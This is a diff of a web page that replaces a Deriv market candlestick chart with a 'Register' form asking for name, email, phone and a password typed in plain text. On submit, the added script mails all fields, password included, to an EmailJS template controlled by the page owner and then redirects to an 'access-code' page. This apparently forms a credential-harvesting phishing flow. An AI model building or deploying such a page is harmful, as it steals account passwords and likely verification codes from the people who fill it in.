@@ -1,180 +1,129 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Deriv Live Candlestick Chart</title>
+  <meta charset="UTF-8">
+  <title>Register with EmailJS</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("wkI_zzv-LS-eRPwAA"); // Replace with your EmailJS public key
+    })();
+  </script>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f4f6f9;
+      background: #eef1f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .form-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      width: 350px;
+    }
+
+    h2 {
       text-align: center;
-      margin: 0;
-      padding: 0;
+      margin-bottom: 20px;
     }
-    header {
-      background: #4a90e2;
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
       color: white;
-      padding: 1rem;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
     }
-    .controls {
-      margin: 1rem;
+
+    button:hover {
+      background: #0056b3;
     }
-    select, input, button {
-      padding: 0.5rem;
-      margin: 0.5rem;
-    }
-    #chart {
-      width: 95%;
-      height: 600px;
-      margin: auto;
+
+    .message {
+      margin-top: 10px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <header>
-    <h2>Deriv Live Candlestick Chart</h2>
-  </header>
 
-  <div class="controls">
-    <select id="market-select">
-      <option value="R_100">Volatility 100 Index</option>
-      <option value="R_50">Volatility 50 Index</option>
-      <option value="R_25">Volatility 25 Index</option>
-      <option value="R_10">Volatility 10 Index</option>
-      <option value="R_75">Volatility 75 Index</option>
-      <option value="1HZ100V">Volatility 100 (1s)</option>
-      <option value="1HZ50V">Volatility 50 (1s)</option>
-      <option value="1HZ10V">Volatility 10 (1s)</option>
-      <option value="Boom_1000_Index">Boom 1000 Index</option>
-      <option value="Crash_1000_Index">Crash 1000 Index</option>
-      <option value="Boom_500_Index">Boom 500 Index</option>
-      <option value="Crash_500_Index">Crash 500 Index</option>
-    </select>
-
-    <select id="time-select">
-      <option value="60">1 Minute</option>
-      <option value="300">5 Minutes</option>
-      <option value="900">15 Minutes</option>
-    </select>
-
-    <input id="price-input" type="number" placeholder="Enter Trade Price" />
-
-    <button onclick="toggleSMA()">Toggle SMA</button>
+  <div class="form-container">
+    <h2>Register</h2>
+    <form id="registerForm">
+      <div class="form-group">
+        <label for="name">Name</label>
+        <input type="text" id="name" name="user_name" required />
+      </div>
+      <div class="form-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="user_email" required />
+      </div>
+      <div class="form-group">
+        <label for="phone">Phone</label>
+        <input type="tel" id="phone" name="user_phone" required pattern="[0-9]{10}" />
+        
+        </div>
+        <div>
+        <label for="name">password</label>
+        <input type="text" id="password" name="Password" required />
+      </div>
+      <div>
+      <button type="submit">Register</button>
+      <div class="message" id="message"></div>
+     <p> already have an account <a href="login.html">login</a></p>
+    </form>
   </div>
 
-  <div id="chart"></div>
+  
 
-  <script src="https://cdn.plot.ly/plotly-latest.min.js"></script>
   <script>
-    let socket;
-    let smaVisible = false;
-    let smaLine = null;
-    let market = document.getElementById("market-select").value;
-    let interval = parseInt(document.getElementById("time-select").value);
+  const form = document.getElementById('registerForm');
+  const message = document.getElementById('message');
 
-    document.getElementById("market-select").addEventListener("change", updateChart);
-    document.getElementById("time-select").addEventListener("change", updateChart);
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
 
-    function toggleSMA() {
-      smaVisible = !smaVisible;
-      updateChart();
-    }
+    emailjs.sendForm('service_xuw4eys', 'template_c0462aw', form)
+      .then(() => {
+        // Optional: Show a quick success message before redirect
+        message.style.color = 'green';
+        message.textContent = 'Registration info sent successfully! Redirecting...';
 
-    function updateChart() {
-      market = document.getElementById("market-select").value;
-      interval = parseInt(document.getElementById("time-select").value);
-      if (socket) socket.close();
-      connectSocket();
-    }
+        // Redirect after a short delay (e.g., 2 seconds)
+        setTimeout(() => {
+          window.location.href = 'access-code.html';
+        }, 2000);
 
-    function connectSocket() {
-      socket = new WebSocket("wss://ws.binaryws.com/websockets/v3?app_id=1089");
-
-      socket.onopen = () => {
-        socket.send(JSON.stringify({
-          ticks_history: market,
-          style: "candles",
-          adjust_start_time: 1,
-          count: 100,
-          granularity: interval,
-          subscribe: 1
-        }));
-      };
-
-      socket.onmessage = (event) => {
-        const data = JSON.parse(event.data);
-
-        if (data.candles) {
-          drawChart(data.candles);
-        } else if (data.tick) {
-          // Live tick - could be used to extend chart
-        }
-      };
-    }
-
-    function drawChart(candles) {
-      const x = candles.map(c => new Date(c.epoch * 1000));
-      const open = candles.map(c => c.open);
-      const high = candles.map(c => c.high);
-      const low = candles.map(c => c.low);
-      const close = candles.map(c => c.close);
-
-      const candlestick = {
-        x, open, high, low, close, type: 'candlestick',
-        name: market, increasing: {line: {color: 'green'}},
-        decreasing: {line: {color: 'red'}}
-      };
-
-      const line = {
-        x, y: close, type: 'scatter', mode: 'lines+markers',
-        line: {color: '#666'}, name: 'Price Line'
-      };
-
-      let data = [candlestick, line];
-
-      if (smaVisible) {
-        const sma = calcSMA(close, 10);
-        const smaTrace = {
-          x: x.slice(10 - 1),
-          y: sma,
-          type: 'scatter',
-          mode: 'lines',
-          line: {color: 'blue'},
-          name: 'SMA (10)'
-        };
-        data.push(smaTrace);
-      }
-
-      const tradePrice = parseFloat(document.getElementById("price-input").value);
-      if (!isNaN(tradePrice)) {
-        const priceLine = {
-          x, y: Array(x.length).fill(tradePrice),
-          type: 'scatter', mode: 'lines',
-          line: {color: 'orange', dash: 'dot'},
-          name: 'Trade Price'
-        };
-        data.push(priceLine);
-      }
-
-      Plotly.newPlot('chart', data, {
-        title: Live Market: ${market},
-        xaxis: {rangeslider: {visible: false}},
-        yaxis: {autorange: true}
+        form.reset();
+      }, (error) => {
+        message.style.color = 'red';
+        message.textContent = 'Failed to send: ' + error.text;
       });
-    }
+  });
+</script>
 
-    function calcSMA(data, period) {
-      const sma = [];
-      for (let i = 0; i <= data.length - period; i++) {
-        const slice = data.slice(i, i + period);
-        const avg = slice.reduce((a, b) => a + b, 0) / period;
-        sma.push(avg);
-      }
-      return sma;
-    }
-
-    connectSocket();
-  </script>
 </body>
 </html>
